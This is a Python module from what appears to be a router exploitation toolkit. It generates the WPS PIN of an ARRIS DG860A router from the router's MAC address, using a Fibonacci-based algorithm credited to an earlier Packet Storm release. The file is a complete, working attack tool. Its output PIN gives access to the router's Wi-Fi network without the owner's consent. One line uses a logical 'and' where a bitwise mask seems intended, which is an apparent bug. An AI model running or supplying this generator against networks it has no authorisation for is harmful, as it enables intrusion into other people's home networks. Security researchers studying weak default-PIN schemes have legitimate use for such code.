# Name:ARRIS DG860A WPS PIN Generator
# File:dg860a_mac2wps.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 23.7.2015
# Last modified: 23.7.2015
# Shodan Dork:
# Description: Generates WPS pin for Arris DG860A router based on mac
# Based on work of Justin Oberdorf
# https://packetstormsecurity.com/files/123631/ARRIS-DG860A-WPS-PIN-Generator.html

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:ARRIS DG860A WPS PIN Generator
File:dg860a_mac2wps.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 23.7.2015
Description: Generates WPS pin for Arris DG860A router based on mac
Based on: Work of Justin Oberdorf https://packetstormsecurity.com/files/123631/ARRIS-DG860A-WPS-PIN-Generator.html

Options:
    Name        Description

    mac         MAC address used as input for WPS pin generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")


        fibnum = [0, 0, 0, 0, 0, 0]
        fibsum = 0
        seed = 16
        count = 1
        offset = 0
        counter = 0
        a = 0

        macs = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        tmp = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

        c = 0
        while c < 12:
            macs[a] = int(mac[c]+mac[c+1], 16)
            tmp[a] = int(mac[c] + mac[c+1], 16)
            a += 1
            c += 2

        for i in range(6):
            if tmp[i] > 30:
                while tmp[i] > 31:
                    tmp[i] -= 16
                    counter += 1

            if counter == 0:
                if tmp[i] < 3:
                    tmp[i] = tmp[0]+tmp[1]+tmp[2]+tmp[3]+tmp[4]+tmp[5]-tmp[i]
                    if tmp[i] > 0xff:
                        tmp[i] = tmp[i] and 0xff
                    tmp[i] = int(tmp[i] % 28) + 3

                fibnum[i] = self.fib_gen(tmp[i])

            else:
                fibnum[i] = self.fib_gen(tmp[i]) + self.fib_gen(counter)
            counter = 0

        for i in range(6):
            fibsum += (fibnum[i] * self.fib_gen(i+seed))+macs[i]

        fibsum %= 10000000
        checksum = self.compute_checksum(fibsum)
        fibsum = (fibsum * 10) + checksum
        print_success("WPS generated")
        print("WPS PIN: " + str(fibsum))

    def fib_gen(self, n):
        if n == 1 or n == 2 or n == 0:
            return 1
        else:
            return self.fib_gen(n-1) + self.fib_gen(n-2)

    def compute_checksum(self, s):
        accum = 0
        s *= 10
        accum += 3 * ((s // 10000000) % 10)
        accum += 1 * ((s // 1000000) % 10)
        accum += 3 * ((s // 100000) % 10)
        accum += 1 * ((s // 10000) % 10)
        accum += 3 * ((s // 1000) % 10)
        accum += 1 * ((s // 100) % 10)
        accum += 3 * ((s // 10) % 10)

        digit = (accum % 10)
        return (10 - digit) % 10


Misc()
